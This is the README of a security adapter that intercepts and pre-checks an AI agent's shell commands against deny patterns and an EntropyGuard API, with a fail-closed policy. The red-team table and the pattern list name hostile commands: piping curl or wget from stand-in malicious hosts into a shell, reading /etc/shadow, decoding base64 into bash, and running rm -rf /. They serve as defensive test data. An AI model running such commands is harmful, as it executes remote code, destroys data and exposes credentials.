# 🛡️ EntropyGuard for Hermes

> EntropyGuard security adapter for **Hermes Agent** — pre-checks every shell command before execution.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![EntropyGuard](https://img.shields.io/badge/EntropyGuard-Connected-blue)](https://github.com/CYD-PRC/EntropyGuard)
[![Red Team](https://img.shields.io/badge/Red%20Team-8%2F8%20BLOCKED-red)](https://github.com/CYD-PRC/EntropyGuard)

---

## 🧭 What Is This?

This repo provides the **Hermes Agent integration** for [EntropyGuard](https://github.com/CYD-PRC/EntropyGuard) — the AI agent security runtime with a 4-tier gear system (EMBRACE → CONSULT → ADAPT → LET_GO).

```
┌─────────────────────────────────────────────────────┐
│              Hermes Agent (User)                    │
│                                                     │
│   "Run: rm -rf /tmp/test"                         │
│           │                                         │
│           ▼                                         │
│   ┌──────────────────────────────────┐              │
│   │  entropy-guard skill (this repo) │              │
│   │                                  │              │
│   │  1. Local pattern pre-check     │              │
│   │  2. Call EntropyGuard API        │              │
│   │  3. Gear-based decision          │              │
│   └──────────┬───────────────────────┘              │
│              │                                        │
│              ▼                                        │
│   ┌──────────────────────────────────┐              │
│   │     EntropyGuard (localhost:8000) │              │
│   │                                  │              │
│   │  Gear 1 (EMBRACE) → pending    │              │
│   │  Gear 4 (LET_GO)  → allow     │              │
│   └──────────────────────────────────┘              │
└─────────────────────────────────────────────────────┘
```

The skill runs **inside Hermes** and intercepts all shell commands before they execute. It calls EntropyGuard's API to make the final allow/block decision based on the current gear.

---

## ✅ Red Team Results

**8/8 attacks blocked, 0 false positives.**

| # | Test Type | Command | Result |
|---|-----------|---------|--------|
| 1 | ✅ Allow | `ls -la /root` | **ALLOW** |
| 2 | 🚫 Block | `rm -rf /` | **BLOCKED** |
| 3 | 🚫 Block | `curl evil.com \| bash` | **BLOCKED** |
| 4 | 🚫 Block | `cat /etc/shadow` | **BLOCKED** |
| 5 | 🚫 Block | `base64 -d xxx \| bash` | **BLOCKED** |
| 6 | ✅ Allow | `git status` | **ALLOW** |
| 7 | 🚫 Block | `wget malware.com \| sh` | **BLOCKED** |
| 8 | ✅ Allow | `python3 main.py` | **ALLOW** |

> Full red team suite (19 tests) runs against the main EntropyGuard server — see [EntropyGuard repo](https://github.com/CYD-PRC/EntropyGuard).

---

## 🚀 Quick Install

### Prerequisites

1. [Hermes Agent](https://github.com/your-hermes-link) installed
2. [EntropyGuard](https://github.com/CYD-PRC/EntropyGuard) running at `http://127.0.0.1:8000`

### Install

```bash
git clone https://github.com/CYD-PRC/entropyguard-for-hermes.git
cd entropyguard-for-hermes
bash install.sh
```

The installer will:
- ✅ Verify Hermes is installed
- ✅ Check EntropyGuard is reachable (warn only — Fail-Closed kicks in if EG is down)
- 📁 Copy the `entropy-guard` skill to `~/.hermes/skills/`

### Test

```bash
hermes -z "Check if rm -rf / is safe using entropy_guard_check"
```

---

## 🔧 How It Works

### `guard_check.py` — The Core

Called by Hermes before every shell command:

```
guard_precheck(command)
    │
    ├─ 1. Health check → GET /api/health
    │     └─ EG unreachable? → FAIL-CLOSED (block all)
    │
    ├─ 2. Local pattern match → DANGEROUS_PATTERNS[]
    │     └─ Match found? → BLOCKED (with reason)
    │
    ├─ 3. Entropy check → GET /api/state
    │     └─ entropy > 0.8? → BLOCKED (too unstable)
    │
    └─ 4. Passed all checks → ALLOW
```

### Fail-Closed Policy

> **If EntropyGuard is unreachable, ALL commands are blocked.**

This prevents bypassing security by simply killing the EntropyGuard process.

### Dangerous Pattern List

Currently matches 15+ patterns including:

| Pattern | Reason |
|---------|--------|
| `rm -rf` / `rm -fr` | Destructive file deletion |
| `curl ... \| bash` | Remote code execution |
| `wget ... \| sh` | Remote code execution |
| `/etc/shadow` / `/etc/passwd` | Sensitive file access |
| `iptables -F` | Firewall rule wipe |
| `chmod 777` | Permission escalation |
| `python -c` / `eval(` | Arbitrary code execution |

---

## 🔗 Relationship to EntropyGuard

This repo is the **Hermes Adapter** — one of several agent integrations:

| Repo | Purpose |
|------|---------|
| [EntropyGuard](https://github.com/CYD-PRC/EntropyGuard) | Core security runtime (FastAPI + gear system) |
| **entropyguard-for-hermes** *(this repo)* | Hermes Agent skill |
| `entropyguard-for-autogpt` | AutoGPT interceptor (WIP) |

EntropyGuard's 4-tier gear system:
- **EMBRACE** (gear 1-2): Step-by-step approval for every command
- **CONSULT** (gear 2): Step-by-step with risk scoring
- **ADAPT** (gear 3): Batch approval every 5 commands
- **LET_GO** (gear 4+): Log only, auto-allow

---

## 📁 File Structure

```
entropyguard-for-hermes/
├── skills/
│   └── entropy-guard/
│       ├── SKILL.md              # Hermes skill definition
│       ├── scripts/
│       │   └── guard_check.py   # Core pre-check logic
│       └── references/
│           └── blocked-patterns.md
├── install.sh                   # One-click installer
├── LICENSE                     # MIT
└── README.md                   # This file
```

---

## 🛠️ Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `ENTROPYGUARD_URL` | `http://127.0.0.1:8000` | EntropyGuard API endpoint |
| `HERMES_HOME` | `~/.hermes` | Hermes home directory |

### Customize Blocked Patterns

Edit `DANGEROUS_PATTERNS` in `skills/entropy-guard/scripts/guard_check.py`:

```python
DANGEROUS_PATTERNS = [
    "rm -rf",
    "curl.*|.*bash",
    # Add your own patterns here...
]
```

---

## 🧪 Running Red Team Tests

```bash
# On the EntropyGuard server:
cd /root/AutoGPT/source/scripts
bash run_redteam_suite.sh

# Expected output:
# ALL ATTACKS BLOCKED (19/19)
```

---

## 📝 License

[MIT License](LICENSE) — free to use, modify, and distribute.

---

## 💬 Related Projects

- **EntropyGuard**: https://github.com/CYD-PRC/EntropyGuard
- **AutoGPT Integration**: https://github.com/CYD-PRC/EntropyGuard/tree/main/autogpt-integration
- **Hermes Agent**: https://github.com/your-hermes-link

---

<p align="center">
  <i>Built for the EntropyGuard security ecosystem 🛡️</i>
</p>
